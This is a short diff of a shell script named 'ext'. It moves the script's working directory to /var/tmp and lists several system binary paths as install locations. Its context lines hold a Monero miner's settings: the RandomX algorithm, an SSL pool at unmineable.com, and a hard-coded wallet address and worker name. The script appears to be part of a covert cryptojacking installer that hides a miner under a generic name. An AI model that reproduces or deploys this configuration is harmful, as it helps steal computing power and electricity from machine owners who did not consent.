@@ -1,8 +1,8 @@
 #!/bin/sh
 
 NAME="ext"
-TMP="/tmp/$NAME"
-DIRS="/tmp/$NAME /usr/bin/$NAME /usr/libexec/$NAME /usr/local/bin/$NAME"
+TMP="/var/tmp/$NAME"
+DIRS="/var/tmp/$NAME /tmp/$NAME /usr/bin/$NAME /usr/libexec/$NAME /usr/local/bin/$NAME"
 
 ARGS="-a rx -o stratum+ssl://rx.unmineable.com:443 -u XMR:47fMDLBVDbH55CZQbzkynHHqVF78K9UQQK1E6bxzHgi4EMKE8AJCjMUcbDMAqrBCJRfPzu4RfKQQHBWvbg7ocYvvR7FNzkg.unmineable_worker_wnhicnes#tbt4-dz6a -p x"
 
